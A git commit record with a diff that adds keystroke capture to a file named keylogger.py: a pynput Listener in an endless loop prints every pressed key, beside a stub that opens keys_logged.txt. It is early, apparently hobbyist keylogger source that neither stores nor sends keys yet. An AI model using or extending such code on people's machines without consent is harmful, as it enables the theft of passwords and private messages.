8dc82bfdbcf7c4dd1e911688c693485ad7567176
NejcBohinjc <nbohinjc@gmail.com>
2024-06-26 16:15:11 +0100

    added a function that prints the keys pressed and a while loop to make it go infinitely

--- keylogger.py
+++ keylogger.py
@@ -1,6 +1,14 @@
-
+from pynput.keyboard import Key, Listener
 
 
 #this function creates a txt file
 def create_txt():
    keys_logged_file = open("keys_logged.txt", "a")
+
+#this function prints the pressed key
+def on_press(key):
+   print(key)
+
+while True:
+   with Listener(on_press = on_press) as listener:
+      listener.join()
